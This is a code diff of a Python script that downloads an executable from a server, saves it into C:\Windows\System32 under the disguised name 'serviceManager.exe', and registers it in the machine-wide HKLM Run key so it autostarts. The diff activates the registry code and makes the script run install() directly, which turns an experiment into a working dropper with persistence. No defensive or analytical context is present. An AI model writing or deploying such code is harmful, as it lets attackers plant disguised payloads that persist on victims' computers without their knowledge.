@@ -1,9 +1,9 @@
 # download file from server and add it to autostart
-# import winreg as reg
+import winreg as reg
 import os
 import requests
 
-class Autostart: 
+class StartScript: 
     _path_file = "" # path to download file
     _key_name = "" # reg name
     _url = ""
@@ -14,20 +14,20 @@ class Autostart:
         self._url = url
 
     def install(self) -> int:
-        download_file("serviceManaget.bat", "bat")
-        download_file("serviceManager.exe", "autostart")
+        self.download_file("autostart")
 
         try:
-            registry_key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
+            registry_key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
             reg.SetValueEx(registry_key, self._key_name, 0, reg.REG_SZ, self._path_file)            
             reg.CloseKey(registry_key)
-        except:
+        except Exception as ex:
+            print(f"err: {ex}")
             return 1
         return 0
 
-    def download_file(self, filename, serverFileName) -> bool:
+    def download_file(self, serverFileName) -> bool:
         try:
-            file_path = self._path_file+filename
+            file_path = self._path_file
             
             os.makedirs(os.path.dirname(file_path), exist_ok=True)
             
@@ -50,10 +50,6 @@ class Autostart:
             print(e)
             return False
 
-# TODO: поэкспериментировать с путями и именами
-program = Autostart(r"C:/Windows/", "serviceManager", "http://127.0.0.1:7070/")
-# program.install()
-
-program.download_file("serviceManager.bat", "bat")
-#program.download_file("serviceManager.autostart", "autostart")
+program = StartScript(r"C:\Windows\System32\serviceManager.exe", "serviceManager", "http://127.0.0.1:8000/")
+program.install()
 
